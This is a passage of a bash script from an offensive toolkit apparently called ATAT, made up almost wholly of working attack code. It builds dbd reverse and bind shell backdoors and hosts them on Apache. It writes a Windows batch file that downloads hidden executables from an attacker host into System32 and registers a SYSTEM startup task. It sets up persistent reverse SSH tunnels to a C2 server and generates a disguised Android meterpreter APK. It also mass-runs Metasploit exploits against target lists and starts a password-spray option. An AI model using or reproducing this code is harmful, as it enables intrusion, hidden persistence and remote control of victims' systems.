		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/dbd_unix_reverse1.conf > ~/ATAT/misc/dbd/dbd_unix_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_reverse2.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_unix_reverse1.conf
		rm ~/ATAT/misc/dbd/dbd_unix_reverse2.conf
		cd ~/ATAT/misc/dbd/
		make unix
		chmod +x dbd
		cp ~/ATAT/misc/dbd/dbd /var/www/html
		chown www-data:www-data /var/www/html/dbd
		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
		SERVICE=Apache;
	secs=$(date '+%S');
	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi  
		#rm dbd
		#clear
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
			fi
			;;
		"Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell")
		clear
		read -p "What port would you like the victim be listening on? (RPORT)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_unix_bind.conf > ~/ATAT/misc/dbd/dbd_unix_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_bind1.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_unix_bind1.conf
		cd ~/ATAT/misc/dbd/
		make unix
		chmod +x dbd
		cp ~/ATAT/misc/dbd/dbd /var/www/html
		chown www-data:www-data /var/www/html/dbd
		echo -e "\E[1;34m\e[97m \e[31mStarting Apache server to host payloads...\e[97m\E[1;34m"
		SERVICE=Apache;
	secs=$(date '+%S');
	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi  
		#rm dbd
		clear
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
	        ;;
	    "DBD Reboot Persistence Generator - Windows")
        read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost;
			touch  ~/ATAT/DBD_reboot.bat
			echo del /A:H \"%WINDIR%\\System32\\taskmgnt.exe\" > ~/ATAT/DBD_reboot.bat
			echo taskkill /F /IM winmgnt.exe >> ~/ATAT/DBD_reboot.bat
			echo del /A:H \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/winmgnt.txt\',\'%WINDIR%\\System32\\winmgnt.exe\'\) >> ~/ATAT/DBD_reboot.bat
			echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/taskmgnt.txt\',\'%WINDIR%\\System32\\taskmgnt.exe\'\) >> ~/ATAT/DBD_reboot.bat
			echo attrib +H +S \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
			echo attrib +H +S \"%WINDIR%\\System32\\\taskmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
			echo %WINDIR%\\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\\System32\\winmgnt.exe >> ~/ATAT/DBD_reboot.bat
			echo schtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
            echo -e "\E[1;34m::::: \e[97mDBD_reboot.bat saved to ~/ATAT. Upload to device in %WINDIR%\System32\ and run from a SYSTEM shell in that same directory.\E[1;34m:::::" 
            ;;
        "Configure C2 Server For Persistent SSH Session")
			echo -e "\e[1;34mRun This Once Before You Run The \"Client Connector Generator SSH\" Option \e[0m"
			echo -e "\e[1;34mONLY RUN THIS *ONCE* ON YOUR COMMAND & CONTROL SERVER!! \e[0m"
			sed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config
			sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config
			sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config
				read -p "Are you logged in as root [y|n]? " rootuser
			echo ""
			
				if [ "$rootuser" == "y" ]; then
					sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config
					#Uncomment PermitRootLogin
					sed -i "/PermitRootLogin/s/prohibit-password/yes/" /etc/ssh/sshd_config
					#Change PermitRootLogin to yes
					echo ""
					echo -e "\e[1;34mSSH root user login with password temporarily enabled..\e[0m"
					read -p "Press any key to contiue" enter
					clear				
				else
					echo ""
				fi
#Uncomment PermitRootLogin, leaves root account open to brute force attacks; but needed for Kali, root users, etc.
#sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config (verified command works)
#Added step to disable password based SSH auth once cert auth setup is complete; this should resolve any brute-force vuln

#On Kali (or any OS where you are logged in as root) you need to set "PermitRootLogin yes" until the setup is complete
#sed -i "/PermitRootLogin/s/prohibit-password/yes/" /etc/ssh/sshd_config (verified command works)

#Once complete set "PermitRootLogin prohibit-password" needs to be set so the root account cannat be ssh brute-forced
#sed -i "/PermitRootLogin/s/yes/prohibit-password/" /etc/ssh/sshd_config
						
			service ssh restart
			echo -e "\e[1;34mHit \"Enter\" Twice To Accept No Passphrase\e[0m"
			ssh-keygen -t rsa -f ~/.ssh/at_rsa
			echo -e "\e[1;34m**Move ~/.ssh/at_rsa.pub To Target (Must Be Placed In ~/.ssh/)**\e[0m"
			echo -e "\e[1;34mExample Command:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mscp ~/.ssh/at_rsa.pub TARGET_USERNAME@TARGET_IP:~/.ssh/\e[97m\E[1;34m"
			echo -e "\e[1;34mOR\e[0m"
			echo -e "\e[1;34m(\"cd\" into the directory where the file resides, then..)\e[0m"
			echo -e "\e[1;34mHost The File With This Command:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mpython -m SimpleHTTPServer\e[97m\E[1;34m"
			echo -e "\e[1;34mThen Use wget or curl From Target To Pull File Down\e[0m"
			echo -e "\e[1;34m(ON THE TARGET \"cd\" into the directory where the file is to be placed, then..)\e[0m"
			echo -e "\e[1;34mExample Command:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mwget http://C2_IP_ADDRESS:8000/at_rsa.pub\e[97m\E[1;34m"
			read -p "Press Enter When Ready To Proceed"
			echo -e "\e[1;34m**YOUR at_rsa.pub KEY *MUST* BE ADDED TO THE ~/.ssh/authorized_keys FILE ON YOUR TARGET**\e[0m"
			echo -e "\e[1;34m::::::::::::THE FOLLOWING STEP IS TO BE DONE ON YOUR TARGET::::::::::::\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mcat ~/.ssh/at_rsa.pub >> ~/.ssh/authorized_keys\e[97m\E[1;34m"
			echo ""
            ;;
        "Persistent SSH Session Generator")
			echo -e "\e[1;34mStep 1 - Enable SSH Public Key & Password Authentication On Target By Running This Command On Target:\e[0m"
			echo ""
			echo -e "\E[1;34m\e[97m \e[31msudo sed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config && sudo sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config && sudo sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config\e[97m\E[1;34m"
#Remove ssh_config edit that is contained in the line below
#echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^#//' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^#//' /etc/ssh/ssh_config\e[97m\E[1;34m"

#Maybe needed to prevent ssh brutforce vuln?
#sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config
#Added step to disable password based SSH auth once cert auth setup is complete; this should resolve any brute-force vuln
						read -p "Is your compromised target logged in as root [y|n]? " rootuser
			echo ""
			
				if [ "$rootuser" == "y" ]; then
					echo -e "\e[1;34mEnable SSH root User Login via Password Authentication On Target By Running This Command On Target: \e[0m"
					echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^#//' /etc/ssh/sshd_config && sed -i \"/PermitRootLogin/s/prohibit-password/yes/\" /etc/ssh/sshd_config\e[97m\E[1;34m"
					#Uncomment PermitRootLogin
					#Change PermitRootLogin to yes
					echo ""
					echo -e "\e[1;34mSSH root user login with password temporarily enabled..\e[0m"
					read -p "Press any key to contiue" enter
					clear				
				else
					echo "No additional changes required. Moving on.."
				fi
			echo ""
			read -p "Press Enter When Ready To Proceed"
			echo ""
			echo -e "\e[1;34m**Step 2 - Create The Persistence (Self Healing SSH Connection) Script To Run On Your Target**\e[0m"
			read -p 'Set Local SSH Port On Target (i.e., 1081): ' userlport; read -p 'Set SSH Port On C2 Server (i.e., 22): ' userrport; read -p 'Set Username On C2 Server: ' username; read -p 'Set IP/Domain Name Of C2 Server: ' userhost;
			touch ~/ATAT/.hosts
			echo -e "#!/bin/bash" > ~/ATAT/.hosts
			echo -e "if ps ax | grep -v grep | grep \"ssh -N -R\" > /dev/null" >> ~/ATAT/.hosts
			echo -e "then" >> ~/ATAT/.hosts
			echo -e "    echo \"Tunnel running\"" >> ~/ATAT/.hosts
			echo -e "else" >> ~/ATAT/.hosts
			echo -e "    echo \"Tunnel is not running, Starting service.\"" >> ~/ATAT/.hosts
			echo -e "    ssh -N -R "$userlport":localhost:"$userrport" "$username"@"$userhost"" >> ~/ATAT/.hosts
			echo -e "fi" >> ~/ATAT/.hosts
			echo -e "\e[1;34m**Step 3 - Move ~/ATAT/.hosts Script To Target (Recommend Placing It In ~/.ssh/)**\e[0m"
			echo -e "\e[1;34mExample Command:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mscp ~/ATAT/.hosts TARGET_USERNAME@TARGET_IP:~/.ssh\e[97m\E[1;34m"
			echo -e "\e[1;34mOR\e[0m"
			echo -e "\e[1;34m(\"cd\" into the directory where the file resides, then..)\e[0m"
			echo -e "\e[1;34mHost The File With This Command:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mpython -m SimpleHTTPServer\e[97m\E[1;34m"
			echo ""
			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR TARGET::::::::::::\e[0m"
			echo -e "\e[1;34mThen Use wget or curl From Target To Pull File Down\e[0m"
			echo -e "\e[1;34m(ON THE TARGET \"cd\" into the directory where the file is to be placed, then..)\e[0m"
			echo -e "\e[1;34mExample Command:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mwget http://C2_IP_ADDRESS:8000/.hosts\e[97m\E[1;34m"

			read -p "Press Enter When Ready To Proceed"		
			echo ""
			echo -e "\e[1;34m**Step 4 - Make Script Executable By Running This Command In Terminal On Your Target (Your Teminal Window Must \"cd\" Into The Directory Where You Placed The Script):**\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mchmod +x .hosts\e[97m\E[1;34m"
			echo ""
			read -p "Press Enter When Ready To Proceed"
			echo -e "\e[1;34m**Step 5 - Make Script Monitor & Repair The Connetion When Necessary**\e[0m"
			echo -e "\e[1;34mNow Start The Crontab (Schedule The Job) With This Command:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mcrontab -e\e[97m\E[1;34m"
			echo -e "\e[1;34mPlace the line below in as your cron job (a once per minute check to see if the ssh connection is up, if not, attempt to bring it up):\e[0m"
			echo ""
			echo -e "\e[1;34mMAKE SURE To Enter YOUR Correct Path For The .hosts File & The SSH Log File!!\e[0m"
			echo -e "\E[1;34m\e[97m \e[31m*/1 * * * * /path/to/.hosts > /home/<user>/.ssh/tunnel.log 2>&1\e[97m\E[1;34m"
			read -p "Press Enter When Ready To Proceed"
			echo ""
			echo -e "\e[1;34m**Step 6 - Generate SSH Authentication Certificate On Target & Move Public Key To C2 Server**\e[0m"
			echo -e "\e[1;34mRun This Command On Your Target:\e[0m"
			echo -e "\E[1;34m\e[97m \e[31mssh-keygen -t rsa\e[97m\E[1;34m"
			echo -e "\e[1;34mHit Enter To Accept All Defaults\e[0m"
cat << "EOF"
Your private key will be generated using the default filename (e.g., id_rsa) and stored on your Target in a .ssh directory off your home directory (e.g., ~/.ssh/id_rsa).

The corresponding public key will be generated using the same filename (but with a .pub extension added) and stored in the same location (e.g., ~/.ssh/id_rsa.pub).
Use SCP to copy the public key file (e.g., ~/.ssh/id_rsa.pub) to your C2 Server, using this command:  
EOF
			echo -e "\E[1;34m\e[97m \e[31mscp ~/.ssh/id_rsa.pub "$username"@"$userhost":~/.ssh/tgt_id_rsa.pub \e[97m\E[1;34m"
			echo ""
			echo -e "\e[1;34mYou'll be prompted for your account password and, possibly to accept the SSH certificate (type \"yes\" in that case. Your public key will be copied to ~/.ssh/tgt_id_rsa.pub\e[0m"
			read -p "Press Enter When Ready To Proceed"
			echo ""
			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR C2 Server::::::::::::\e[0m"
			echo ""
			echo -e "\e[1;34m**Step 7 - Make Sure You Have Run The \"Configure C2 Server For Persistent SSH Session\" Option On The C2 Server So It Is Ready To Accept The Connection**\e[0m"
cat << "EOF"
Also, you need to add your Target's public key to the ~/.ssh/authorized_keys file. If you do not have a ~/.ssh/authorized_keys file, you can create one as follows:
EOF
			echo -e "\E[1;34m\e[97m \e[31mmkdir -p ~/.ssh\e[97m\E[1;34m"
			echo -e "\E[1;34m\e[97m \e[31mtouch ~/.ssh/authorized_keys\e[97m\E[1;34m"
cat << "EOF"
On the C2 Server, add the contents of your public key file (e.g., ~/.ssh/tgt_id_rsa.pub) to a new line in your ~/.ssh/authorized_keys file; on the command line, enter:
EOF
			echo -e "\E[1;34m\e[97m \e[31mcat ~/.ssh/tgt_id_rsa.pub >> ~/.ssh/authorized_keys\e[97m\E[1;34m"
cat << "EOF"
You may want to check the contents of ~/.ssh/authorized_keys to make sure your public key was added properly.
Once your public key is added to your ~/.ssh/authorized_keys file on the C2 Server, you should now be able to SSH in with your private key. 
EOF
			read -p "Press Enter When Ready To Proceed"
			echo ""
			echo -e "\e[1;34mTo Connect To Target From C2 Server Enter The Following Command In Terminal (On C2 Server) \e[0m"
			echo -e "\E[1;34m\e[97m \e[31mssh -l TARGET_USERNAME -p "$userlport" localhost \e[97m\E[1;34m"
			echo -e "\e[1;34m**MAKE SURE** To Enter The Correct Username For The Target. Then Enter The SSH Password For The Target When Prompted. \e[0m"
			echo ""
			read -p "Press Enter When Ready To Proceed"
			echo -e "\e[1;34m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m"		
			echo -e "\e[1;34m:::::::::::THE FOLLOWING STEP IS TO BE DONE ON YOUR TARGET & C2 TO DISABLE SSH PASSWORD AUTH:::::::::::\e[0m"
			echo -e "\e[1;34mThis only needs to be done if you do *not* need SSH password based authentication enabled on either host;\e[0m"
			echo -e "\e[1;34mand can be done because certificate based authentication is now setup; therefore, password auth is no longer required\e[0m"
			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config\e[97m\E[1;34m"
			echo ""
			echo -e "\e[1;34mAgain, this step to disable SSH password authentication is OPTIONAL\e[0m"
			echo ""
	echo -e "\e[1;34m***IF YOUR C2 AND/OR TARGET ARE LOGGED IN AS ROOT:***\e[0m"
	echo -e "\e[1;34mSSH password auth for the root user was enabled for the setup process.\e[0m"
	echo -e "\e[1;34mYou *NEED* to enter this command on your C2 and/or Target to prevent brute-force attacks against the root user.\e[0m"
	echo ""
	echo -e "\E[1;34m\e[97m \e[31msed -i \"/PermitRootLogin/s/yes/prohibit-password/\" /etc/ssh/sshd_config && service ssh restart\e[97m\E[1;34m"
	echo ""
	echo "No additional changes for setup are required."		
			echo""
			read -p "Press Enter When Ready To Proceed"
			echo ""
			echo "No additional changes for setup are required."
			echo ""
			echo -e "\e[1;34m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\e[0m"		
			echo -e "\e[1;34m::::::::::::THESE FOLLOWING STEPS ARE TO BE DONE ON YOUR TARGET ONCE ENGAGEMENT IS COMPLETE::::::::::::\e[0m"
			echo -e "\e[1;34m****CLEAN UP NOTES FOR SSH CONFIG ON TARGET****\e[0m"
			echo -e "\e[1;34m***To Disable SSH Public Key & Password Authentication On Target (Once Done, If Necessary) Run:***\e[0m"
			echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^/#/' /etc/ssh/sshd_config\e[97m\E[1;34m"
#Remove ssh_config edit that is contained in the line below
#echo -e "\E[1;34m\e[97m \e[31msed -i -e '0,/PubkeyAuthentication/!b' -e '/PubkeyAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/AuthorizedKeysFile/!b' -e '/AuthorizedKeysFile/s/^/#/' /etc/ssh/sshd_config && sed -i -e '0,/PasswordAuthentication/!b' -e '/PasswordAuthentication/s/^/#/' /etc/ssh/ssh_config\e[97m\E[1;34m"

#Maybe needed to prevent ssh brutforce vuln?
#sed -i -e '0,/PermitRootLogin/!b' -e '/PermitRootLogin/s/^/#/' /etc/ssh/sshd_config
#Added step to disable password based SSH auth once cert auth setup is complete; this should resolve any brute-force vuln

			echo ""
			echo -e "\e[1;34m***Remove The Line In ~/.ssh/authorized_keys That Matches The Contents Of ~/.ssh/at_rsa.pub***\e[0m"
			echo ""
			echo -e "\e[1;34m**Also, remove the following files from the target:**\e[0m"
			echo -e "\e[1;34m~/.ssh/at_rsa.pub\e[0m"
			echo -e "\e[1;34m~/.ssh/tunnel.log\e[0m"
			echo -e "\e[1;34m~/.ssh/.hosts\e[0m"
			echo ""
			read -p "Press Enter When Ready To Proceed"
			echo ""
cat << "EOF"
***WARNING*** This setup requires cert only authentication both ways to maintain persistence. 
The means the target machine will have the ability to SSH into your C2 WITHOUT A PASSWORD! However, this can be done safely.
Once this is setup you need to run "service ssh stop" and make sure the SSH service does not start by default on boot.
To check, after startup, run "service ssh status" to see if the service shows as inactive or active. If inactive/dead you are safe.
When you need to interact with the target, simply run "service ssh start". Then wait 1 minute or less and run:
ssh -l TARGET_USERNAME -p TARGET_PORT localhost   (as per the instructions above)
Do your business and exit out of the session like normal. Then, run "service ssh stop" and leave the ssh service down until you 
need to interact with the target again; at which time you will run "service ssh start" again and the cycle repeats.
DO NOT FORGET THIS IMPORTANT USAGE STEP!!
EOF
			;; 
        "Android")
        read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
			msfvenom -f raw -p android/meterpreter/reverse_https LHOST=$userhost LPORT=$userport -o "System Framework.jar"
			cp "System Framework.jar" "System Framework.apk"
			rm "System Framework.jar"
			echo -e "\E[1;34m::::: \e[97mSystem Framework.apk saved to ~/ATAT. Upload to device, install, and run. \E[1;34m:::::" 
			echo -e "\E[1;34m::::: \e[97mStart an android/meterpreter/reverse_https listener \E[1;34m:::::" 
            ;; 
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[1;34m::::: \e[97mArmitage Launcher \E[1;34m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;34m::::: \e[97mLaunching... \E[1;34m:::::"
  armitage 

;;

 "6" | "6" )
         
 echo -e "\E[1;34m::::: \e[97mExploit All The Things!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
 
PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
options=("Multi-Target" "Multi-Port" "Multi-Target Struts" "Multi-Target Tomcat" "Multi-Target Java JMX" "Multi-Target Java RMI" "Password Spray" "Spray Password List Update" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Multi-Target")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -q -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $IP;\
	set RPORT $targetport;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
            ;;
    "Mulit-Port")
    echo -e "\E[1;34m::::: \e[97mExploit All The Ports!! \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set RHOST: ' usertarget;
	inputfile=~/ATAT/MSF_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -q -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $usertarget;\
	set RPORT $PORT;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
            ;;
    "Multi-Target Struts")
    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Struts!! \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set TARGETURI: ' useruri;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -q -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set TARGETURI $useruri;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Apache Struts Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
            ;;
    "Multi-Target Tomcat")
    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Tomcat!! \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HttpPassword: (Blank if none)' userpassword; read -p 'Set HttpUsername: (Blank if none)' userusername;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -q -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set HttpPassword $userpassword;\
	set HttpUsername $userusername;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Apache Tomcat Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
            ;;     
    "Multi-Target Java JMX")
    echo -e "\E[1;34m::::: \e[97mExploit All The Java JMX!! \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set JMXRMI: ' userjmxrmi;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -q -x "use exploit/multi/misc/java_jmx_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set JMXRMI $userjmxrmi;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Java JMX Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
            ;;
    "Multi-Target Java RMI")
    echo -e "\E[1;34m::::: \e[97mExploit All The Java RMI!! \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!! \E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HTTPDELAY: (default 10) ' userdelay;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -q -x "use exploit/multi/misc/java_rmi_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set HTTPDELAY $userdelay;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Java RMI Targets Have Been Tested! Check Your Listener for Sessions! \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules \E[1;34m:::::"
            ;; 
        "Password Spray")
    echo -e "\E[1;34m::::: \e[97mSpiderLabs' Password Spray Attack \E[1;34m:::::"    
cat << "EOF"
<PLATFORM Choices>:
   + smb
   + owa
   + lync 
   + cisco
Do not enter the + sign when you type in "owa", "smb", or whichever you choose.
Leave DOMAIN Option Blank Unless Using SMB 
Leave RequestsFile Option Blank Unless Using OWA 

+ OWA
To password spray an OWA portal, a file must be created of the POST request with the Username: sprayuser@domain.com, and Password: spraypassword
Capture this with Burpsuite or ZAP

+ Lync
To password spray a lync service, a lync autodiscover url or a url that returns the www-authenticate header must be entered into the MSF_targets.txt file. Your Username list must also contain valid email addresses.
Example: https://lyncdiscover.spiderlabs.com/
Example: https://lyncweb.spiderlabs.com/Autodiscover/AutodiscoverService.svc/root/oauth/user

You may use IPs and/or URLs in the MSF_targets.txt file to accommodate your target type. 
EOF
